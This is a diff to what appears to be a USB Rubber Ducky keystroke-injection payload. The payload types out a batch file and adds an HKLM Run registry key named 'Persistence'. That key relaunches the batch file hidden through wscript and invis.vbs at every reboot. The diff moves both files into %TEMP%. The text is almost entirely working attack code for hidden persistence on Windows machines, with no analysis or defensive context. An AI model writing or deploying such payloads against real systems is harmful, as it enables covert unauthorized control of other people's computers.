@@ -27,11 +27,14 @@ ENTER
 REM Make the batch file. 
 STRING copy con batch.bat
 ENTER
-REM Copy current program to another location. 
-STRING COPY %0 %TEMP%
-ENTER
 REM Registry key that restarts script on reboot. 
 STRING REG ADD HKLM\Software\Microsoft\Windows\CurrentVersion\Run /v Persistence /t REG_SZ /d "wscript.exe %TEMP%\invis.vbs %TEMP%\batch.bat" /f
+ENTER
+REM Copy invis.bat to another location
+STRING move invis.vbs %TEMP%
+ENTER
+REM Copy current program to another location. 
+STRING move %0 %TEMP%
 ENTER
 REM Continue batch file contents here. . . 
 CONTROL z
@@ -49,6 +52,6 @@ CONTROL Z
 ENTER
 STRING wscript.exe invis.vbs batch.bat
 ENTER
-STRING EXIT
+STRING exit
 ENTER
 ```
